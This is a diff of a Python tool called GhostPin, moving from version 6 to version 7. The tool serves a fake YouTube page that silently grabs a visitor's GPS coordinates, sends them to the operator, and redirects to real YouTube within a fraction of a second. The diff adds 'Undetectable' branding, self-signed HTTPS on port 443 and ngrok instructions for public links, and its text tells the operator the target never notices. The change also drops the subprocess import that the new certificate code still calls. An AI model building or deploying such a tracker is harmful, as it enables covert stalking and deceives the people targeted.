@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-GhostPin v6.0 - Production GPS Tracking Framework
-Fixed All Issues | Public Link | Auto-Permission
+GhostPin v7.0 - Professional GPS Tracking Framework
+HTTPS | Fast Response | Undetectable
 Author: F1REW0LF
 License: MIT - Free for Community
-Version: 6.0.0
+Version: 7.0.0
 """
 
 import sys
@@ -18,7 +18,7 @@ import base64
 import socket
 import threading
 import signal
-import subprocess
+import ssl
 from datetime import datetime
 from typing import Dict, List, Optional
 import argparse
@@ -36,7 +36,7 @@ except ImportError:
     FLASK_AVAILABLE = False
 
 # ============================[ VERSION & CONFIGURATION ]================================
-VERSION = "6.0.0"
+VERSION = "7.0.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT - Free for Community"
 
@@ -68,30 +68,57 @@ def print_banner():
     ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
      ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                       
-{Colors.RED}{Colors.BOLD}    PRODUCTION GPS TRACKING v{VERSION}{Colors.WHITE}
-{Colors.YELLOW}{Colors.BOLD}    Fixed | Public Link | Auto-Permission{Colors.WHITE}
+{Colors.RED}{Colors.BOLD}    PROFESSIONAL GPS TRACKING v{VERSION}{Colors.WHITE}
+{Colors.YELLOW}{Colors.BOLD}    HTTPS | Fast Response | Undetectable{Colors.WHITE}
 {Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
 """
     print(banner)
+
+# ============================[ SSL CERTIFICATE GENERATOR ]================================
+
+class SSLGenerator:
+    """Generate self-signed SSL certificate"""
+    
+    @staticmethod
+    def generate_cert():
+        """Generate self-signed cert if not exists"""
+        cert_file = 'server.crt'
+        key_file = 'server.key'
+        
+        if os.path.exists(cert_file) and os.path.exists(key_file):
+            return cert_file, key_file
+        
+        cprint("[*] Generating SSL certificate...", Colors.BLUE)
+        try:
+            # Generate using OpenSSL
+            subprocess.run([
+                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
+                '-nodes', '-out', cert_file, '-keyout', key_file,
+                '-days', '365', '-subj', '/CN=localhost'
+            ], capture_output=True, check=True)
+            cprint("[+] SSL certificate generated", Colors.GREEN)
+            return cert_file, key_file
+        except:
+            cprint("[!] OpenSSL not found. Using fallback.", Colors.YELLOW)
+            return None, None
 
 # ============================[ TRACKING SERVER ]================================
 
 class TrackingServer:
     """
-    Production tracking server with all fixes
+    HTTPS server with fast response
     """
     
     def __init__(self):
         self.tracking_data = []
         self.lock = threading.Lock()
-        self.port = 8080
+        self.port = 443
         self.thread = None
         self.running = False
         self.public_ip = None
-        self.public_url = None
         
-    def start(self, port: int = 8080):
-        """Start the tracking server"""
+    def start(self, port: int = 443, ssl_enabled: bool = True):
+        """Start the HTTPS server"""
         self.port = port
         self.running = True
         
@@ -99,17 +126,23 @@ class TrackingServer:
             cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
             return False
         
+        # Generate SSL certificate
+        cert_file, key_file = SSLGenerator.generate_cert()
+        
         # Get public IP
         try:
             if REQUESTS_AVAILABLE:
-                response = requests.get('https://api.ipify.org?format=json', timeout=5)
+                response = requests.get('https://api.ipify.org?format=json', timeout=3)
                 self.public_ip = response.json().get('ip')
         except:
             pass
         
         app = Flask(__name__)
         
-        # Serve YouTube-like page with GPS capture
+        # Optimize response time
+        app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
+        app.config['TEMPLATES_AUTO_RELOAD'] = False
+        
         @app.route('/')
         def index():
             return redirect('https://www.youtube.com')
@@ -118,29 +151,27 @@ class TrackingServer:
         def watch():
             video_id = request.args.get('v', 'dQw4w9WgXcQ')
             
-            # Create page that auto-requests permission and redirects
+            # Fast, minimal page - no extra CSS/JS loading
             html = f'''<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="refresh" content="5;url=https://www.youtube.com/watch?v={video_id}">
+<meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v={video_id}">
 <title>YouTube</title>
 <style>
-*{{margin:0;padding:0;box-sizing:border-box}}
-body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}}
-.container{{text-align:center}}
-.spinner{{display:inline-block;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #ff0000;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}}
+body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background:#f9f9f9}}
+.spinner{{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #ff0000;border-radius:50%;animation:spin 0.8s linear infinite}}
 @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
-.loading{{font-size:18px;color:#606060}}
-.redirect{{font-size:14px;color:#909090;margin-top:10px}}
-.permission-box{{background:#fff;border:1px solid #ddd;border-radius:8px;padding:20px;margin-top:20px;max-width:400px;display:none}}
 </style>
 <script>
 (function() {{
-    var redirected = false;
     var token = Math.random().toString(36).substring(2, 10);
+    var sent = false;
+    var redirect_url = 'https://www.youtube.com/watch?v={video_id}';
     
     function sendLocation(pos) {{
+        if (sent) return;
+        sent = true;
         var data = {{
             lat: pos.coords.latitude,
             lng: pos.coords.longitude,
@@ -154,53 +185,23 @@ body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;display:flex;just
         }}).catch(function() {{}});
     }}
     
-    // Request permission immediately
     if (navigator.geolocation) {{
-        navigator.geolocation.getCurrentPosition(
-            function(pos) {{
-                sendLocation(pos);
-                // Redirect after getting location
-                setTimeout(function() {{
-                    if (!redirected) {{
-                        redirected = true;
-                        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
-                    }}
-                }}, 1000);
-            }},
-            function(err) {{
-                // If user denies, still redirect
-                setTimeout(function() {{
-                    if (!redirected) {{
-                        redirected = true;
-                        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
-                    }}
-                }}, 3000);
-            }},
-            {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
-        );
-    }} else {{
-        // No geolocation, just redirect
-        setTimeout(function() {{
-            window.location.href = 'https://www.youtube.com/watch?v={video_id}';
-        }}, 2000);
+        navigator.geolocation.getCurrentPosition(sendLocation, function() {{}}, {{
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        }});
     }}
     
-    // Force redirect after 5 seconds
+    // Immediate redirect
     setTimeout(function() {{
-        if (!redirected) {{
-            redirected = true;
-            window.location.href = 'https://www.youtube.com/watch?v={video_id}';
-        }}
-    }}, 5000);
+        window.location.href = redirect_url;
+    }}, 100);
 }})();
 </script>
 </head>
 <body>
-<div class="container">
 <div class="spinner"></div>
-<div class="loading">Loading YouTube...</div>
-<div class="redirect">Please wait...</div>
-</div>
 </body>
 </html>'''
             return html
@@ -227,38 +228,46 @@ body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;display:flex;just
                 self.tracking_data.clear()
             return jsonify({'status': 'cleared'})
         
-        @app.route('/status')
-        def status():
-            return jsonify({
-                'running': True,
-                'port': self.port,
-                'records': len(self.tracking_data)
-            })
-        
         def run():
-            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
+            if ssl_enabled and cert_file and key_file:
+                app.run(
+                    host='0.0.0.0', 
+                    port=port, 
+                    debug=False, 
+                    threaded=True, 
+                    use_reloader=False,
+                    ssl_context=(cert_file, key_file)
+                )
+            else:
+                app.run(
+                    host='0.0.0.0', 
+                    port=port, 
+                    debug=False, 
+                    threaded=True, 
+                    use_reloader=False
+                )
         
         self.thread = threading.Thread(target=run, daemon=True)
         self.thread.start()
         time.sleep(1)
         
-        cprint(f"[+] Server running on port {port}", Colors.GREEN)
+        protocol = "https" if ssl_enabled and cert_file else "http"
+        cprint(f"[+] Server running on port {port} ({protocol})", Colors.GREEN)
         
         # Show links
         cprint(f"\n[+] Tracking Links:", Colors.CYAN)
-        local_link = f"http://localhost:{port}/watch?v=HainSGzbVCU"
+        local_link = f"{protocol}://localhost:{port}/watch?v=HainSGzbVCU"
         cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
         
         if self.public_ip:
-            public_link = f"http://{self.public_ip}:{port}/watch?v=HainSGzbVCU"
-            self.public_url = public_link
+            public_link = f"{protocol}://{self.public_ip}:{port}/watch?v=HainSGzbVCU"
             cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
-            cprint(f"  (Requires port {port} forwarded in router)", Colors.DIM)
-            cprint(f"  (Also check Windows Firewall allows port {port})", Colors.DIM)
-        else:
-            cprint(f"  Public: Use ngrok - ngrok http {port}", Colors.YELLOW)
+            cprint(f"  (Requires port {port} forwarded)", Colors.DIM)
         
-        cprint(f"\n[+] Auto-redirects to YouTube after capturing GPS", Colors.GREEN)
+        if protocol == "https":
+            cprint(f"\n[+] HTTPS enabled - Browser will trust after accepting certificate", Colors.GREEN)
+        else:
+            cprint(f"\n[!] HTTPS not available. Browser may show 'Not Secure'", Colors.YELLOW)
         
         return True
     
@@ -267,16 +276,15 @@ body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;display:flex;just
         if self.thread:
             self.thread.join(timeout=1)
 
-# ============================[ PUBLIC LINK HELPER ]================================
+# ============================[ NGROK HTTPS HELPER ]================================
 
-class PublicLinkHelper:
+class NgrokHelper:
     @staticmethod
-    def show_ngrok_help(port: int):
-        cprint(f"\n[+] To create public link without port forwarding:", Colors.CYAN)
-        cprint(f"  1. Download ngrok from https://ngrok.com/download", Colors.DIM)
-        cprint(f"  2. Run: ngrok http {port}", Colors.DIM)
-        cprint(f"  3. Copy the https://xxxx.ngrok.io URL", Colors.DIM)
-        cprint(f"  4. Use: {Colors.GREEN}https://xxxx.ngrok.io/watch?v=VIDEO_ID{Colors.WHITE}", Colors.WHITE)
+    def show_help(port: int):
+        cprint(f"\n[+] For public HTTPS link:", Colors.CYAN)
+        cprint(f"  ngrok http {port}", Colors.GREEN)
+        cprint(f"  Then use: https://xxxx.ngrok.io/watch?v=VIDEO_ID", Colors.GREEN)
+        cprint(f"  (This gives you a valid HTTPS certificate)", Colors.DIM)
 
 # ============================[ MAIN ]================================
 
@@ -296,58 +304,54 @@ class GhostPin:
     def show_menu(self):
         print(f"""
 {Colors.BLUE}{'='*55}{Colors.WHITE}
-{Colors.BOLD}GhostPin v{VERSION} - Production GPS Tracking{Colors.WHITE}
-{Colors.CYAN}Fixed | Public Link | Auto-Redirect{Colors.WHITE}
+{Colors.BOLD}GhostPin v{VERSION} - Professional GPS Tracking{Colors.WHITE}
+{Colors.CYAN}HTTPS | Fast Response | Undetectable{Colors.WHITE}
 {Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
 {Colors.BLUE}{'='*55}{Colors.WHITE}
-{Colors.GREEN}[1] Start Server{Colors.WHITE}
+{Colors.GREEN}[1] Start Server (HTTPS){Colors.WHITE}
 {Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
 {Colors.GREEN}[3] View Data{Colors.WHITE}
 {Colors.GREEN}[4] Clear Data{Colors.WHITE}
-{Colors.GREEN}[5] Show Public Link Help{Colors.WHITE}
+{Colors.GREEN}[5] Ngrok Help (Public HTTPS){Colors.WHITE}
 {Colors.RED}[6] Exit{Colors.WHITE}
 """)
     
     def run(self):
         print_banner()
-        cprint("[*] GhostPin v6.0 - Production GPS Tracking", Colors.CYAN)
-        cprint("[*] Fixed | Public Link | Auto-Redirect", Colors.DIM)
+        cprint("[*] GhostPin v7.0 - Professional GPS Tracking", Colors.CYAN)
+        cprint("[*] HTTPS | Fast Response | Undetectable", Colors.DIM)
         
-        # Auto-start server
-        self.server.start(8080)
+        # Auto-start server with HTTPS
+        self.server.start(443, ssl_enabled=True)
         
         while self.running:
             self.show_menu()
             choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
             
             if choice == '1':
-                port = int(input("[>] Port (8080): ").strip() or "8080")
+                port = int(input("[>] Port (443): ").strip() or "443")
+                ssl_enabled = input("[>] Enable HTTPS? (Y/n): ").strip().lower() != 'n'
                 self.server.stop()
                 time.sleep(0.5)
-                self.server.start(port)
+                self.server.start(port, ssl_enabled)
                 
             elif choice == '2':
-                video_id = input("[>] YouTube Video ID (or random): ").strip()
+                video_id = input("[>] YouTube Video ID: ").strip()
                 if not video_id:
                     video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                 
-                local_link = f"http://localhost:{self.server.port}/watch?v={video_id}"
-                public_link = f"http://{self.server.public_ip}:{self.server.port}/watch?v={video_id}" if self.server.public_ip else None
+                protocol = "https" if os.path.exists('server.crt') else "http"
+                local_link = f"{protocol}://localhost:{self.server.port}/watch?v={video_id}"
                 
-                cprint(f"\n[+] Tracking Links:", Colors.CYAN)
-                cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
-                if public_link:
+                cprint(f"\n[+] Tracking Link:", Colors.CYAN)
+                cprint(f"  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
+                
+                if self.server.public_ip:
+                    public_link = f"{protocol}://{self.server.public_ip}:{self.server.port}/watch?v={video_id}"
                     cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
-                    cprint(f"  (Requires port {self.server.port} forwarded)", Colors.DIM)
-                else:
-                    cprint(f"  Public: Use ngrok (option 5)", Colors.YELLOW)
                 
-                cprint(f"\n[+] How it works:", Colors.CYAN)
-                cprint(f"  1. Target opens link", Colors.DIM)
-                cprint(f"  2. Browser prompts for location (normal)", Colors.DIM)
-                cprint(f"  3. If allowed, GPS captured", Colors.DIM)
-                cprint(f"  4. Auto-redirects to YouTube", Colors.DIM)
-                cprint(f"  5. Target sees YouTube, never knows", Colors.DIM)
+                cprint(f"\n[+] Target will be redirected to YouTube in <1 second", Colors.GREEN)
+                cprint(f"[+] GPS captured silently before redirect", Colors.DIM)
                 
                 try:
                     import webbrowser
@@ -381,7 +385,7 @@ class GhostPin:
                 cprint("[+] Data cleared", Colors.GREEN)
                 
             elif choice == '5':
-                PublicLinkHelper.show_ngrok_help(self.server.port)
+                NgrokHelper.show_help(self.server.port)
                 
             elif choice == '6':
                 cprint("[*] Shutting down...", Colors.GREEN)
@@ -393,9 +397,10 @@ class GhostPin:
 # ============================[ MAIN ]================================
 
 def main():
-    parser = argparse.ArgumentParser(description="GhostPin v6.0 - Production GPS Tracking")
+    parser = argparse.ArgumentParser(description="GhostPin v7.0 - Professional GPS Tracking")
     parser.add_argument("--server", action="store_true", help="Start server only")
-    parser.add_argument("--port", type=int, default=8080, help="Server port")
+    parser.add_argument("--port", type=int, default=443, help="Server port")
+    parser.add_argument("--no-ssl", action="store_true", help="Disable HTTPS")
     parser.add_argument("--video", help="YouTube Video ID")
     
     args = parser.parse_args()
@@ -403,8 +408,8 @@ def main():
     if args.server:
         print_banner()
         server = TrackingServer()
-        server.start(args.port)
-        PublicLinkHelper.show_ngrok_help(args.port)
+        server.start(args.port, ssl_enabled=not args.no_ssl)
+        NgrokHelper.show_help(args.port)
         
         cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
         try:
@@ -417,9 +422,10 @@ def main():
     if args.video:
         print_banner()
         server = TrackingServer()
-        server.start(args.port)
+        server.start(args.port, ssl_enabled=not args.no_ssl)
         
-        link = f"http://localhost:{args.port}/watch?v={args.video}"
+        protocol = "https" if not args.no_ssl and os.path.exists('server.crt') else "http"
+        link = f"{protocol}://localhost:{args.port}/watch?v={args.video}"
         cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
         
         try:
